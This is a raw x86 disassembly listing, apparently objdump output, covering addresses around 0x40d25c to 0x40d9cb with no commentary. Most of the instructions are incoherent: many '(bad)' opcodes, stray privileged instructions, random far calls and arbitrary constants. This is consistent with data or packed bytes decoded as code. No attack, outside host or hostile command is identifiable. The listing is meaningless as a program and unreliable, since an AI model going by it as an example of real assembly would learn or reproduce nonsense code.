  40d25c:	push   edi
  40d25d:	push   0x7c
  40d25f:	int    0x79
  40d261:	push   cs
  40d262:	sub    dh,BYTE PTR [edx+0x69dedc14]
  40d268:	and    BYTE PTR [esi+esi*4-0x1a606d6b],0x3a
  40d270:	imul   BYTE PTR [esi-0x4a86d869]
  40d276:	lock mov eax,0xe9260a40
  40d27c:	retf   
  40d27d:	xchg   esp,eax
  40d27e:	add    esp,esi
  40d280:	aas    
  40d281:	adc    ah,BYTE PTR [esi]
  40d283:	xchg   BYTE PTR [eax+edx*1-0xa],bh
  40d287:	inc    esi
  40d288:	and    al,0x75
  40d28a:	movaps XMMWORD PTR [edx],xmm0
  40d28d:	cmp    DWORD PTR [esp+edx*1],ecx
  40d290:	push   ss
  40d291:	or     BYTE PTR [edi+0x784ea400],bl
  40d297:	mov    edi,0xfb8d95be
  40d29c:	jl     0x40d2c8
  40d29e:	clc    
  40d29f:	mov    ebx,0x4e899251
  40d2a4:	cmp    BYTE PTR [ebx],cl
  40d2a6:	or     bl,BYTE PTR [ecx-0x326dd2c6]
  40d2ac:	jo     0x40d23c
  40d2ae:	mov    bh,0x49
  40d2b0:	jge    0x40d27f
  40d2b2:	add    DWORD PTR [ebp+0x4b612329],esi
  40d2b8:	or     al,0xa
  40d2ba:	xchg   esp,eax
  40d2bb:	inc    edi
  40d2bc:	add    BYTE PTR [esi+0x67c8e467],bh
  40d2c2:	add    edx,DWORD PTR [esi-0x36506813]
  40d2c8:	hlt    
  40d2c9:	(bad)  
  40d2ca:	int3   
  40d2cb:	das    
  40d2cc:	lods   eax,DWORD PTR ds:[esi]
  40d2cd:	pop    ebx
  40d2ce:	or     dl,BYTE PTR [eax-0x484c9777]
  40d2d4:	pop    ebp
  40d2d5:	cmp    dl,al
  40d2d7:	mov    eax,ds:0x131ce6d8
  40d2dc:	or     eax,DWORD PTR [ebx+0x8079190]
  40d2e2:	mov    bl,0xe5
  40d2e4:	or     eax,0xee4e6a28
  40d2e9:	test   DWORD PTR [ecx-0x7772418f],eax
  40d2ef:	xchg   esi,eax
  40d2f0:	dec    ebx
  40d2f1:	mov    bl,0x28
  40d2f3:	sbb    dh,0x94
  40d2f6:	cmc    
  40d2f7:	ss enter 0xb9b1,0xb2
  40d2fc:	or     dl,BYTE PTR ds:0x67f89db1
  40d302:	cmp    eax,0xa049d147
  40d307:	aad    0x27
  40d309:	leave  
  40d30a:	ja     0x40d38b
  40d30c:	dec    edi
  40d30d:	scas   al,BYTE PTR es:[edi]
  40d30e:	inc    ebp
  40d30f:	xlat   BYTE PTR ds:[ebx]
  40d310:	adc    DWORD PTR [esi+0x73],ecx
  40d313:	es iret 
  40d315:	call   0x7c47:0x9dfe1439
  40d31c:	les    ebp,FWORD PTR [ebx]
  40d31e:	jns    0x40d2c5
  40d320:	(bad)  
  40d321:	jge    0x40d387
  40d323:	(bad)  
  40d324:	aam    0x32
  40d326:	adc    eax,0x4815f120
  40d32b:	pop    es
  40d32c:	aaa    
  40d32d:	test   DWORD PTR [edx+0x62],esi
  40d330:	pop    edi
  40d331:	outs   dx,DWORD PTR ds:[esi]
  40d332:	xchg   esi,eax
  40d333:	mov    ax,ds:0x5f773d3a
  40d339:	aad    0xbd
  40d33b:	cdq    
  40d33c:	or     ch,BYTE PTR [edi]
  40d33e:	cld    
  40d33f:	and    eax,0x6bb8bff5
  40d344:	mov    bh,0x2c
  40d346:	xchg   esp,eax
  40d347:	push   esi
  40d348:	sub    DWORD PTR ds:0x1a9b6249,0x8bf0be65
  40d352:	cmp    BYTE PTR [edi-0x71b165bb],ah
  40d358:	jge    0x40d375
  40d35a:	(bad)  
  40d35b:	loope  0x40d3a7
  40d35d:	mov    eax,0xc5955126
  40d362:	or     al,ah
  40d364:	in     eax,dx
  40d365:	mov    al,0xda
  40d367:	test   al,0xb7
  40d369:	imul   BYTE PTR [eax-0x4e]
  40d36c:	rcr    bh,cl
  40d36e:	popf   
  40d36f:	les    eax,FWORD PTR [ecx+edx*8-0x2d]
  40d373:	or     ch,BYTE PTR [ecx+0x0]
  40d376:	pop    ds
  40d377:	pusha  
  40d378:	daa    
  40d379:	xchg   edi,eax
  40d37a:	ins    DWORD PTR es:[edi],dx
  40d37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d37c:	repnz pop ss
  40d37e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d37f:	xchg   esi,eax
  40d380:	dec    edi
  40d381:	stc    
  40d382:	(bad)  
  40d383:	(bad)  
  40d384:	sar    BYTE PTR [esi-0x77],cl
  40d387:	iret   
  40d388:	(bad)  
  40d389:	adc    cl,BYTE PTR [edi+0x6d]
  40d38c:	fwait
  40d38d:	push   esp
  40d38e:	xchg   ebp,eax
  40d38f:	xchg   DWORD PTR ds:0x15e5f481,ecx
  40d395:	rol    BYTE PTR [ecx-0x400b6817],0x16
  40d39c:	push   ebx
  40d39d:	aad    0xe3
  40d39f:	data16 cs sub al,0xde
  40d3a3:	mov    bh,0x18
  40d3a5:	cdq    
  40d3a6:	nop
  40d3a7:	in     eax,dx
  40d3a8:	pop    esi
  40d3a9:	out    dx,al
  40d3aa:	mov    al,0x79
  40d3ac:	mov    al,ds:0x1f07ffec
  40d3b1:	imul   eax,DWORD PTR [eax+0x2],0x1e4a686f
  40d3b8:	sbb    al,0x17
  40d3ba:	push   eax
  40d3bb:	ins    DWORD PTR es:[edi],dx
  40d3bc:	cmp    al,0xe6
  40d3be:	push   cs
  40d3bf:	dec    ebp
  40d3c0:	pop    ebx
  40d3c1:	adc    eax,0x471fe7e1
  40d3c6:	icebp  
  40d3c7:	outs   dx,BYTE PTR ds:[esi]
  40d3c8:	dec    DWORD PTR [esi-0x3a331681]
  40d3ce:	pop    ebp
  40d3cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3d0:	dec    eax
  40d3d1:	or     esp,DWORD PTR [eax-0x5c697b67]
  40d3d7:	adc    ah,BYTE PTR [eax+edx*4]
  40d3da:	stos   DWORD PTR es:[edi],eax
  40d3db:	mul    BYTE PTR [ecx-0x45]
  40d3de:	sub    edx,DWORD PTR [edx+0x41b6b0db]
  40d3e4:	jp     0x40d36e
  40d3e6:	in     eax,dx
  40d3e7:	sub    al,0xc4
  40d3e9:	icebp  
  40d3ea:	pop    edx
  40d3eb:	pop    es
  40d3ec:	js     0x40d39b
  40d3ee:	(bad)  
  40d3f0:	dec    edx
  40d3f1:	pop    es
  40d3f2:	mov    edx,DWORD PTR [ecx+eiz*8]
  40d3f5:	pop    ds
  40d3f6:	sbb    DWORD PTR [edx+0x24c65385],ebp
  40d3fc:	jecxz  0x40d3a4
  40d3fe:	dec    ebx
  40d3ff:	mov    BYTE PTR [ecx],0xb9
  40d402:	test   DWORD PTR ss:[ebp+0x7b],ecx
  40d406:	cmc    
  40d407:	pop    ds
  40d408:	xor    esp,edx
  40d40a:	repz cmp dl,BYTE PTR [edi]
  40d40d:	sbb    eax,0xb9681995
  40d412:	or     BYTE PTR [eax+0x44],cl
  40d415:	lds    eax,FWORD PTR [ecx]
  40d417:	dec    eax
  40d418:	inc    ecx
  40d419:	xchg   edi,eax
  40d41a:	ins    BYTE PTR es:[edi],dx
  40d41b:	or     eax,0xb119756e
  40d420:	popa   
  40d421:	ins    DWORD PTR es:[edi],dx
  40d422:	mov    al,0xbe
  40d424:	cmp    eax,0x57e54683
  40d429:	mov    ecx,0x4ba5524
  40d42e:	push   esi
  40d42f:	sahf   
  40d430:	mov    edx,0x1c1208b5
  40d435:	scas   al,BYTE PTR es:[edi]
  40d436:	sti    
  40d437:	stc    
  40d438:	xchg   ebx,eax
  40d439:	or     eax,0x31641372
  40d43e:	jae    0x40d4b6
  40d440:	dec    ecx
  40d441:	aaa    
  40d442:	and    dl,BYTE PTR [esi]
  40d444:	or     al,0x3c
  40d446:	loopne 0x40d468
  40d448:	(bad)  
  40d449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d44a:	call   0xa9fa7c13
  40d44f:	mov    ds:0xb54ecd1,eax
  40d454:	sub    dh,0x9e
  40d457:	lea    esp,[ebx]
  40d459:	xor    DWORD PTR [ecx],eax
  40d45b:	in     eax,dx
  40d45c:	dec    ebx
  40d45d:	mov    WORD PTR [esi+0x34525564],?
  40d463:	scas   al,BYTE PTR es:[edi]
  40d464:	adc    ebx,DWORD PTR [edx+0x66]
  40d467:	maskmovq mm1,(bad)
  40d468:	test   DWORD PTR [edi-0x3a],0xec6204c9
  40d46f:	iret   
  40d470:	cld    
  40d471:	sbb    edx,0x1
  40d474:	push   ebx
  40d475:	push   0x754a0ab
  40d47a:	push   fs
  40d47c:	pop    esi
  40d47d:	aam    0xfd
  40d47f:	cmp    al,0x89
  40d481:	cwde   
  40d482:	fmul   st,st(2)
  40d484:	mov    edi,0xcffe3595
  40d489:	xor    eax,0x6dbf2845
  40d48e:	push   edi
  40d48f:	(bad)  
  40d490:	mov    esp,0xc57acf3c
  40d495:	fidivr WORD PTR [ecx+0x4b]
  40d498:	push   edi
  40d499:	cmp    esi,ebp
  40d49b:	ins    BYTE PTR es:[edi],dx
  40d49c:	fild   DWORD PTR [edx+0x5478220f]
  40d4a2:	push   ss
  40d4a3:	and    DWORD PTR [eax+ebx*2-0x61b9e33],0xffffffdb
  40d4ab:	cmp    al,0xde
  40d4ad:	pop    es
  40d4ae:	xor    al,0xcf
  40d4b0:	fst    DWORD PTR [ebx+edx*8-0x6d6ce9c1]
  40d4b7:	or     eax,0xcdd002cc
  40d4bc:	pop    ss
  40d4bd:	out    dx,al
  40d4be:	in     al,0x2f
  40d4c0:	loope  0x40d4b1
  40d4c2:	and    eax,0xd24d67d8
  40d4c7:	shl    cl,cl
  40d4c9:	arpl   WORD PTR [esi+0x4fdf8a9b],si
  40d4cf:	jae    0x40d45f
  40d4d1:	xchg   dh,al
  40d4d3:	jg     0x40d4a1
  40d4d5:	push   esi
  40d4d6:	lods   al,BYTE PTR ds:[esi]
  40d4d7:	jbe    0x40d49b
  40d4d9:	xlat   BYTE PTR ds:[ebx]
  40d4da:	imul   eax,edx,0x3176ab56
  40d4e0:	imul   edi,DWORD PTR [ebp+eax*8+0x46],0xffffffde
  40d4e5:	mov    ebx,0x144f9862
  40d4ea:	push   ecx
  40d4eb:	jl     0x40d46e
  40d4ed:	dec    ah
  40d4ef:	in     eax,0x81
  40d4f1:	or     eax,0x96fb78df
  40d4f6:	pop    ss
  40d4f7:	jns    0x40d4ac
  40d4f9:	pushf  
  40d4fa:	fisub  DWORD PTR [edi+0x33]
  40d4fd:	scas   al,BYTE PTR es:[edi]
  40d4fe:	mov    bl,0x53
  40d500:	xor    al,0x99
  40d502:	xchg   edx,eax
  40d503:	mov    ds:0x51d2bf1c,al
  40d508:	sbb    bh,BYTE PTR [esi]
  40d50a:	dec    eax
  40d50b:	or     BYTE PTR [eax+0x24],bh
  40d50e:	push   esp
  40d50f:	dec    esi
  40d510:	inc    ebp
  40d511:	sbb    eax,0x2c2fbe34
  40d516:	pop    edx
  40d517:	cmc    
  40d518:	aaa    
  40d519:	pop    ds
  40d51a:	stos   BYTE PTR es:[edi],al
  40d51b:	pop    ecx
  40d51c:	cmp    al,0x5b
  40d51e:	push   eax
  40d51f:	ja     0x40d575
  40d521:	dec    esp
  40d522:	cs cwde 
  40d524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d525:	dec    esi
  40d526:	daa    
  40d527:	jmp    DWORD PTR [ebx+0x7d]
  40d52a:	mov    ch,BYTE PTR [edi+0xb8cee4b]
  40d530:	ss es test al,0x9e
  40d534:	inc    ebx
  40d535:	mov    esi,0xae6a0be1
  40d53a:	inc    ebp
  40d53b:	sub    al,0x8c
  40d53d:	ds das 
  40d53f:	out    dx,eax
  40d540:	aaa    
  40d541:	cmp    al,dh
  40d543:	cli    
  40d544:	test   ax,0x143a
  40d548:	mov    dl,0xce
  40d54a:	test   al,0x2c
  40d54c:	fbld   TBYTE PTR [edi]
  40d54e:	add    al,0x6a
  40d550:	ret    
  40d551:	push   0x7
  40d553:	push   edx
  40d554:	push   esi
  40d555:	(bad)  
  40d556:	loope  0x40d5a5
  40d558:	sub    DWORD PTR [edi+0x7f],eax
  40d55b:	mov    dh,0x55
  40d55d:	inc    ecx
  40d55e:	inc    esi
  40d55f:	loopne 0x40d525
  40d561:	lds    edx,FWORD PTR ds:0x3a28f0f6
  40d567:	ret    
  40d568:	xlat   BYTE PTR ds:[ebx]
  40d569:	lock inc eax
  40d56b:	and    al,0xdf
  40d56d:	xchg   edx,eax
  40d56e:	jbe    0x40d5ad
  40d570:	mov    dl,0x7a
  40d572:	push   0x23c9641
  40d577:	and    DWORD PTR ds:0x9607527e,edi
  40d57d:	je     0x40d5a6
  40d57f:	push   edi
  40d580:	mov    esi,0x47826a1d
  40d585:	mov    ch,bh
  40d587:	shl    DWORD PTR [eax+0x4800aa8e],0xf6
  40d58e:	jae    0x40d5ce
  40d590:	ss (bad) 
  40d592:	fst    DWORD PTR [eax+ebx*8+0x77]
  40d596:	stos   BYTE PTR es:[edi],al
  40d597:	(bad)  
  40d598:	jge    0x40d542
  40d59a:	add    ch,al
  40d59c:	dec    edx
  40d59d:	int3   
  40d59e:	adc    eax,0x82b3fd89
  40d5a3:	shl    BYTE PTR [eax+edx*2-0x6d],0x1a
  40d5a8:	xlat   BYTE PTR ds:[ebx]
  40d5a9:	dec    edi
  40d5aa:	dec    ebp
  40d5ab:	push   ecx
  40d5ac:	lahf   
  40d5ad:	dec    ebx
  40d5ae:	cmp    al,0xfd
  40d5b0:	div    BYTE PTR [edx]
  40d5b2:	(bad)  
  40d5b3:	mov    ebx,0x2dbb1e47
  40d5b8:	mov    edi,0xaffd9b3f
  40d5bd:	or     BYTE PTR ds:0xb884b60,bl
  40d5c3:	cmp    al,0xa9
  40d5c5:	call   0xbc8f:0xc91b4d3e
  40d5cc:	outs   dx,BYTE PTR ds:[esi]
  40d5cd:	(bad)  
  40d5ce:	jb     0x40d649
  40d5d0:	mov    bl,0xa3
  40d5d2:	add    al,BYTE PTR [edi+0x11a3c139]
  40d5d8:	int    0x5
  40d5da:	sti    
  40d5db:	adc    dh,BYTE PTR [ebx-0x77]
  40d5de:	push   ds
  40d5df:	xchg   ecx,eax
  40d5e0:	mov    edx,0xba8f975
  40d5e5:	sbb    BYTE PTR [edx+0x49deb316],0x60
  40d5ec:	or     edi,ebp
  40d5ee:	xchg   ebx,eax
  40d5ef:	jbe    0x40d5f8
  40d5f1:	in     al,dx
  40d5f2:	inc    esi
  40d5f3:	and    al,0x48
  40d5f5:	adc    eax,0xc196e872
  40d5fa:	aad    0xa0
  40d5fc:	das    
  40d5fd:	test   BYTE PTR [ecx-0x4d],0x9a
  40d601:	fwait
  40d602:	cmp    al,BYTE PTR [eax+edi*1+0x1]
  40d606:	sbb    BYTE PTR [eax+ebx*8+0x3f45aabc],0xe
  40d60e:	add    al,BYTE PTR [edi-0x13]
  40d611:	fwait
  40d612:	sahf   
  40d613:	push   ss
  40d614:	in     eax,dx
  40d615:	mov    ah,0x71
  40d617:	dec    eax
  40d618:	mov    eax,ds:0x3eabd056
  40d61d:	pop    es
  40d61e:	sbb    bh,BYTE PTR [eax-0x24e257bc]
  40d624:	in     eax,0xd3
  40d626:	jge    0x40d5b6
  40d628:	inc    ecx
  40d629:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40d62b:	enter  0xad98,0xc3
  40d62f:	xlat   BYTE PTR ds:[ebx]
  40d630:	loope  0x40d654
  40d632:	xchg   edx,eax
  40d633:	pop    es
  40d634:	mov    ah,0x18
  40d636:	sub    ah,BYTE PTR [ebp-0x22cbce8c]
  40d63c:	push   0x3d911ef3
  40d641:	or     BYTE PTR [edx],cl
  40d643:	jns    0x40d6b1
  40d645:	int3   
  40d646:	push   esp
  40d647:	jl     0x40d5de
  40d649:	and    eax,0x9acb71c2
  40d64e:	cwde   
  40d64f:	std    
  40d650:	in     eax,0x73
  40d652:	push   es
  40d653:	repnz das 
  40d655:	push   ebx
  40d656:	out    0x80,al
  40d658:	ja     0x40d6b1
  40d65a:	sbb    BYTE PTR [ecx-0x32],0x37
  40d65e:	jno    0x40d65c
  40d660:	sbb    eax,0x68646c13
  40d665:	or     eax,0xb9a09a78
  40d66a:	in     eax,dx
  40d66b:	fbld   TBYTE PTR [esi-0x2b1134ac]
  40d671:	push   edi
  40d672:	leave  
  40d673:	icebp  
  40d674:	mov    ebx,0x166a8f8a
  40d679:	popa   
  40d67a:	fisttp DWORD PTR ds:[esi-0x69fded7e]
  40d681:	xor    DWORD PTR [eax+0x696919e7],ecx
  40d687:	push   eax
  40d688:	call   0xbfc1:0x8b22dd4e
  40d68f:	rcr    DWORD PTR [edi+0x25],1
  40d692:	sbb    eax,0xe8894873
  40d697:	int3   
  40d698:	(bad)  
  40d699:	in     eax,0xd4
  40d69b:	inc    edi
  40d69c:	sub    al,0xa1
  40d69e:	int3   
  40d69f:	push   cs
  40d6a0:	or     esi,ecx
  40d6a2:	push   eax
  40d6a3:	cmp    BYTE PTR [esi],al
  40d6a5:	sbb    bh,BYTE PTR [ecx+0x78]
  40d6a8:	dec    ebp
  40d6a9:	cmp    BYTE PTR [edx+0x6758eab0],ah
  40d6af:	ret    
  40d6b0:	jns    0x40d6b9
  40d6b2:	out    dx,al
  40d6b3:	mov    WORD PTR [ebp+0x6e82394d],cs
  40d6b9:	leave  
  40d6ba:	adc    al,0xf4
  40d6bc:	xchg   ecx,eax
  40d6bd:	inc    ebx
  40d6be:	mov    bl,0x1
  40d6c0:	test   ebx,ecx
  40d6c2:	sbb    edx,0x73
  40d6c5:	out    0xf6,eax
  40d6c7:	test   al,0xcc
  40d6c9:	cdq    
  40d6ca:	push   cs
  40d6cb:	inc    ebx
  40d6cc:	sbb    eax,DWORD PTR [edx]
  40d6ce:	dec    eax
  40d6cf:	enter  0x47e6,0x15
  40d6d3:	inc    ebx
  40d6d4:	js     0x40d70d
  40d6d6:	cmp    BYTE PTR [eax],bl
  40d6d8:	jmp    0x8eb0:0x500b190f
  40d6df:	ss aaa 
  40d6e1:	mov    dl,0x57
  40d6e3:	fadd   DWORD PTR [ebp-0x30d29855]
  40d6e9:	or     DWORD PTR [edx+0x7800cdd],ebp
  40d6ef:	mov    esp,0xeeffb082
  40d6f4:	add    BYTE PTR [ecx-0x5f],al
  40d6f7:	cli    
  40d6f8:	test   edi,ebx
  40d6fa:	pop    esp
  40d6fb:	push   cs
  40d6fc:	jns    0x40d731
  40d6fe:	sub    ecx,DWORD PTR [esi]
  40d700:	sbb    ecx,DWORD PTR [ebx]
  40d702:	repnz pop esp
  40d704:	outs   dx,BYTE PTR ds:[esi]
  40d705:	test   eax,0x4cb8963
  40d70a:	add    cl,bl
  40d70c:	ins    BYTE PTR es:[edi],dx
  40d70d:	cmp    cl,BYTE PTR [ecx+0x67b88997]
  40d713:	imul   esi,DWORD PTR [eax-0x588cd9d],0x4c0fc7a6
  40d71d:	jo     0x40d74b
  40d71f:	into   
  40d720:	mov    ?,ecx
  40d722:	out    0xa,eax
  40d724:	xchg   ecx,eax
  40d725:	fistp  DWORD PTR [ebp+esi*8+0x191db5c4]
  40d72c:	repnz mov ebx,DWORD PTR [eax+0x57]
  40d730:	mov    dh,0x3f
  40d732:	add    al,BYTE PTR [ebp+0x46]
  40d735:	jmp    0x40d760
  40d737:	mov    cl,0xdf
  40d739:	ret    
  40d73a:	lock ins DWORD PTR es:[edi],dx
  40d73c:	sub    BYTE PTR ds:0x8a9c64c1,al
  40d742:	cmp    eax,0xd32fd2fb
  40d747:	outs   dx,BYTE PTR ds:[esi]
  40d748:	dec    ecx
  40d749:	mul    DWORD PTR cs:[ebx+0x5]
  40d74d:	outs   dx,BYTE PTR ds:[esi]
  40d74e:	int    0x7
  40d750:	fcmovnbe st,st(2)
  40d752:	mov    ecx,DWORD PTR [ebx-0x2b1e45f2]
  40d758:	push   0x40870179
  40d75d:	in     al,dx
  40d75e:	inc    esi
  40d75f:	arpl   WORD PTR [edx+edi*4+0xb],sp
  40d763:	stos   DWORD PTR es:[edi],eax
  40d764:	fcomp  QWORD PTR ds:0x2b644c20
  40d76a:	push   0x36ff08aa
  40d76f:	push   0xe75e0657
  40d774:	push   cs
  40d775:	sub    dh,BYTE PTR [ecx-0x68]
  40d778:	fdiv   DWORD PTR [edi-0x2778aa6b]
  40d77e:	sub    al,0x70
  40d780:	xchg   ebp,eax
  40d781:	or     bh,ah
  40d783:	in     al,dx
  40d784:	pop    es
  40d785:	sbb    al,0x41
  40d787:	popf   
  40d788:	fld    st(5)
  40d78a:	jbe    0x40d731
  40d78c:	fs ss push ds
  40d78f:	mov    al,ds:0x8f57068
  40d794:	loop   0x40d7a9
  40d796:	xchg   esp,eax
  40d797:	out    dx,eax
  40d798:	leave  
  40d799:	out    dx,eax
  40d79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d79b:	xor    ch,BYTE PTR [eax]
  40d79d:	add    eax,0xbcb05a5d
  40d7a2:	call   0xaa0f:0xaf1e4842
  40d7a9:	ret    
  40d7aa:	enter  0x347d,0x25
  40d7ae:	enter  0x78c1,0xbd
  40d7b2:	cmp    BYTE PTR [ebx],0xdc
  40d7b5:	add    DWORD PTR [ebx+0x51],0x20
  40d7b9:	loopne 0x40d7e6
  40d7bb:	inc    eax
  40d7bc:	jl     0x40d790
  40d7be:	(bad)  
  40d7bf:	sbb    BYTE PTR [ecx],bl
  40d7c1:	dec    ebp
  40d7c2:	jno    0x40d82d
  40d7c4:	test   DWORD PTR [eax-0x22],eax
  40d7c7:	or     al,0xa3
  40d7c9:	mov    ebp,0xc9677952
  40d7ce:	ds (bad) 
  40d7d0:	add    DWORD PTR fs:[eax],esi
  40d7d3:	mov    edx,0x48d51984
  40d7d8:	jg     0x40d762
  40d7da:	or     bh,BYTE PTR [edi*8-0x116f9a80]
  40d7e1:	mov    ds:0xaddbc147,al
  40d7e6:	adc    BYTE PTR ds:0x5d6b3da7,al
  40d7ec:	push   ebx
  40d7ed:	test   BYTE PTR [ebp+0xca536f9],bl
  40d7f3:	jne    0x40d839
  40d7f5:	add    DWORD PTR [ebx],0xffffffac
  40d7f8:	cdq    
  40d7f9:	aas    
  40d7fa:	pop    ss
  40d7fb:	das    
  40d7fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7fd:	sbb    al,0xfe
  40d7ff:	mov    WORD PTR [esi+0x51],fs
  40d802:	out    dx,al
  40d803:	xchg   ecx,eax
  40d804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d805:	jno    0x40d87a
  40d807:	int3   
  40d808:	cmp    BYTE PTR [ecx],ah
  40d80a:	jbe    0x40d808
  40d80c:	xlat   BYTE PTR ds:[ebx]
  40d80d:	bound  eax,QWORD PTR [eax]
  40d80f:	or     BYTE PTR [ebx-0x65],bl
  40d812:	js     0x40d81c
  40d814:	push   ebp
  40d815:	cmp    al,0x63
  40d817:	jo     0x40d7dc
  40d819:	xchg   ecx,eax
  40d81a:	mov    eax,ds:0x490986c9
  40d81f:	les    eax,FWORD PTR [esi+0xaa5e323]
  40d825:	cs call 0x1d5d0c75
  40d82b:	sbb    dl,cl
  40d82d:	cmp    al,0xe6
  40d82f:	mov    esp,0xd8920685
  40d834:	cld    
  40d835:	fwait
  40d836:	into   
  40d837:	mov    ebx,0x691c02df
  40d83c:	out    0xda,eax
  40d83e:	std    
  40d83f:	jnp    0x40d8b2
  40d841:	imul   esi,edx,0xa5193454
  40d847:	ins    BYTE PTR es:[edi],dx
  40d848:	jnp    0x40d849
  40d84a:	jmp    0x40d84f
  40d84c:	cmp    BYTE PTR [esi],ch
  40d84e:	xor    ebx,DWORD PTR [ecx]
  40d850:	dec    esi
  40d851:	mov    al,ds:0x2f89e5cd
  40d856:	call   0x5e87cfef
  40d85b:	xor    al,0x6e
  40d85d:	pushf  
  40d85e:	push   ebp
  40d85f:	mov    ah,0x80
  40d861:	and    esi,DWORD PTR ds:0x82df37d9
  40d867:	and    eax,0xa75e9fcd
  40d86c:	dec    ebp
  40d86d:	or     al,0xc6
  40d86f:	vmread esi,eax
  40d872:	mov    ch,0x44
  40d874:	or     DWORD PTR [eax+0x31],edx
  40d877:	jno    0x40d842
  40d879:	dec    BYTE PTR [ebx-0x46861d1c]
  40d87f:	sbb    esp,DWORD PTR [ebp+eiz*8-0x40]
  40d883:	iret   
  40d884:	dec    ebp
  40d885:	rcr    cl,0x8f
  40d888:	leave  
  40d889:	cld    
  40d88a:	fadd   st(7),st
  40d88c:	retf   0xffe
  40d88f:	inc    ebp
  40d890:	mov    cl,0xa7
  40d892:	pop    eax
  40d893:	xor    bh,BYTE PTR [ebx-0x5c91c1a8]
  40d899:	add    ebx,DWORD PTR [edx+eax*1]
  40d89c:	sub    BYTE PTR [ebp+0x2c1af72b],cl
  40d8a2:	fwait
  40d8a3:	or     BYTE PTR [edx-0x7cbdea7],cl
  40d8a9:	dec    ecx
  40d8aa:	pushf  
  40d8ab:	loope  0x40d91f
  40d8ad:	push   edi
  40d8ae:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40d8b0:	lahf   
  40d8b1:	sbb    BYTE PTR [edx+0x4f0a8e85],ch
  40d8b7:	and    esp,ebx
  40d8b9:	pop    edx
  40d8ba:	or     esp,ecx
  40d8bc:	mov    bh,0xf7
  40d8be:	add    ch,BYTE PTR [ebx-0x58bbd3f6]
  40d8c4:	ins    BYTE PTR es:[edi],dx
  40d8c5:	xchg   ecx,eax
  40d8c6:	jg     0x40d891
  40d8c8:	sub    cl,bh
  40d8ca:	xor    ah,al
  40d8cc:	mov    ecx,0xfccc379d
  40d8d1:	call   0xae8:0x4045e01d
  40d8d8:	idiv   BYTE PTR [esi]
  40d8da:	and    DWORD PTR [esp+ecx*1+0x2a2a3935],esp
  40d8e1:	stc    
  40d8e2:	add    al,0x6f
  40d8e4:	xchg   ebx,eax
  40d8e5:	imul   ecx,DWORD PTR [ecx+eiz*2-0x79],0x7a
  40d8ea:	dec    ebp
  40d8eb:	mov    ecx,0x5c0485ab
  40d8f0:	out    0xf1,al
  40d8f2:	pop    ebx
  40d8f3:	iret   
  40d8f4:	cmp    al,0xf5
  40d8f6:	mov    ds:0xe6eb644b,al
  40d8fb:	inc    ecx
  40d8fc:	sub    DWORD PTR [ecx],esi
  40d8fe:	xchg   ecx,eax
  40d8ff:	in     eax,0x8c
  40d901:	in     eax,dx
  40d902:	inc    edx
  40d903:	xchg   esi,eax
  40d904:	add    eax,0x7f7771ac
  40d909:	dec    ebp
  40d90a:	inc    edx
  40d90b:	jl     0x40d91a
  40d90d:	xor    al,0xf7
  40d90f:	icebp  
  40d910:	mov    edx,0xbbcc18ff
  40d915:	or     cl,bh
  40d917:	pop    DWORD PTR [esi-0x9]
  40d91a:	(bad)  
  40d91b:	jns    0x40d8b5
  40d91d:	fdiv   DWORD PTR [ebx-0x5c]
  40d920:	(bad)  
  40d921:	imul   ebx,DWORD PTR [edi+0xa0c05a8],0xfffffff7
  40d928:	es xchg esp,eax
  40d92a:	cmovp  ebx,DWORD PTR [ebx+0x63]
  40d92e:	xchg   ecx,eax
  40d92f:	aas    
  40d930:	enter  0xd96a,0xa4
  40d934:	mov    cl,0xf0
  40d936:	mov    ch,dh
  40d938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d939:	mov    esi,0x4c3794eb
  40d93e:	ss retf 
  40d940:	mov    eax,ebp
  40d942:	pop    ebp
  40d943:	js     0x40d94f
  40d945:	xchg   BYTE PTR [esi],dl
  40d947:	test   BYTE PTR [esi],0x84
  40d94a:	jl     0x40d93e
  40d94c:	pushf  
  40d94d:	cmc    
  40d94e:	xchg   esi,eax
  40d94f:	sbb    al,0x7d
  40d951:	popa   
  40d952:	mov    esi,0xce640026
  40d957:	test   eax,0xc92a6091
  40d95c:	jne    0x40d9c0
  40d95e:	adc    DWORD PTR [edi+eax*1+0x5cd92ace],0x6945dbd3
  40d969:	jne    0x40d97f
  40d96b:	cmp    cl,BYTE PTR [ebx+0x59]
  40d96e:	jp     0x40d9d3
  40d970:	ja     0x40d96a
  40d972:	pop    ebp
  40d973:	push   ebp
  40d974:	jle    0x40d9d8
  40d976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d977:	icebp  
  40d978:	mov    ah,0x46
  40d97a:	fadd   DWORD PTR [edi-0x1275780]
  40d980:	ss dec ebp
  40d982:	aam    0x79
  40d984:	mov    ch,0xef
  40d986:	ins    DWORD PTR es:[edi],dx
  40d987:	shl    BYTE PTR [edx],0xbc
  40d98a:	fbstp  TBYTE PTR [eax-0x4bbb8d09]
  40d990:	xchg   esp,eax
  40d991:	or     BYTE PTR [esp+ebp*8],bl
  40d994:	xchg   ecx,eax
  40d995:	dec    ebx
  40d996:	mov    esp,0x11ead0dd
  40d99b:	adc    eax,DWORD PTR [esi]
  40d99d:	push   cs
  40d99e:	gs test al,0x8a
  40d9a1:	mov    eax,ds:0xf5ff0d37
  40d9a6:	xchg   edi,eax
  40d9a7:	mov    al,ds:0xeaf845cd
  40d9ac:	mov    bl,0xcd
  40d9ae:	mov    edx,0x49e9bd26
  40d9b3:	xchg   ebx,eax
  40d9b4:	test   esp,edx
  40d9b6:	add    eax,0x7a149824
  40d9bb:	adc    bl,bh
  40d9bd:	and    eax,0x4b6bcc74
  40d9c2:	push   eax
  40d9c3:	aaa    
  40d9c4:	outs   dx,BYTE PTR ds:[esi]
  40d9c5:	push   ebx
  40d9c6:	sti    
  40d9c7:	cmp    al,0x2f
  40d9c9:	jns    0x40da2e
  40d9cb:	jp     0x40d9e3
